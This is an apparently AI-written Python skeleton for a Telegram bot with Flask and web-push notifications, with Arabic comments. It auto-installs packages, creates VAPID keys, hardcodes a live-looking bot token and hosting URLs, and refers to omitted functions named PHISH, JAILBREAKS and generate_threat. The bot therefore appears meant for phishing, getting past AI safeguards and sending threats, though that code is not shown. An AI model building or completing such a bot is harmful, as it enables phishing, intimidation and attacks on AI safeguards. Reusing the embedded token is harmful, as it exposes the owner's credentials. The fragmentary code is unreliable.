import os, sys, subprocess, time, threading, random, string, logging, io, json, base64
import requests

# ========== تثبيت المكتبات تلقائياً ==========
def safe_install(package, import_name=None):
    name = import_name or package
    try:
        __import__(name)
    except ImportError:
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", package, "--quiet"])
        except: pass

safe_install("flask", "flask")
safe_install("requests", "requests")
safe_install("pyTelegramBotAPI", "telebot")
safe_install("gTTS", "gtts")
safe_install("qrcode[pil]", "qrcode")
safe_install("Pillow", "PIL")
safe_install("pyshorteners", "pyshorteners")
safe_install("deep-translator", "deep_translator")
safe_install("pywebpush", "pywebpush")

from flask import Flask, request
from telebot import TeleBot, types
from io import BytesIO

# ========== توليد مفاتيح VAPID (مرة واحدة، بدون مكتبة vapid) ==========
VAPID_PRIVATE_PEM = "vapid_private.pem"
VAPID_PUBLIC_PEM = "vapid_public.pem"
VAPID_CLAIMS = {"sub": "mailto:admin@gnralbot.com"}

def generate_vapid_keys():
    from cryptography.hazmat.primitives.asymmetric import ec
    from cryptography.hazmat.primitives.serialization import Encoding, PrivateFormat, PublicFormat, NoEncryption
    private_key = ec.generate_private_key(ec.SECP256R1())
    public_key = private_key.public_key()
    with open(VAPID_PRIVATE_PEM, "wb") as f:
        f.write(private_key.private_bytes(Encoding.PEM, PrivateFormat.PKCS8, NoEncryption()))
    with open(VAPID_PUBLIC_PEM, "wb") as f:
        f.write(public_key.public_bytes(Encoding.PEM, PublicFormat.SubjectPublicKeyInfo))
    return private_key, public_key

def load_vapid_keys():
    from cryptography.hazmat.primitives.serialization import load_pem_private_key, load_pem_public_key
    with open(VAPID_PRIVATE_PEM, "rb") as f:
        private_key = load_pem_private_key(f.read(), password=None)
    with open(VAPID_PUBLIC_PEM, "rb") as f:
        public_key = load_pem_public_key(f.read())
    return private_key, public_key

if not os.path.isfile(VAPID_PRIVATE_PEM):
    vapid_private_key, vapid_public_key = generate_vapid_keys()
else:
    vapid_private_key, vapid_public_key = load_vapid_keys()

from cryptography.hazmat.primitives.serialization import Encoding, PublicFormat
public_bytes = vapid_public_key.public_bytes(Encoding.DER, PublicFormat.SubjectPublicKeyInfo)
PUBLIC_KEY = base64.urlsafe_b64encode(public_bytes).decode('utf-8').rstrip('=')

TOKEN = "8558243002:AAGTsGfVX5IfQERVDksCP0crVIYIB6ethqs"
BASE_URL = "https://fgnral-html-5waj.onrender.com"
APP_URL = "https://gamee-h4uf.onrender.com"

bot = TeleBot(TOKEN, threaded=False)
app = Flask(__name__)
user_states = {}
bot_rating = 0

# ========== اختصار الكود لتوفير المساحة (جميع الدوال والتعريفات كما في الإصدارات السابقة) ==========
# ... (نفس دوال PHISH, APPS, JAILBREAKS, get_ai_response, generate_threat, send_notification, الخ)

# يمكنك نسخ باقي الكود من الردود السابقة (كود البوت كاملاً) مع التأكد من استيراد base64

if __name__ == '__main__':
    bot.remove_webhook()
    bot.set_webhook(url=f"{APP_URL}/{TOKEN}")
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))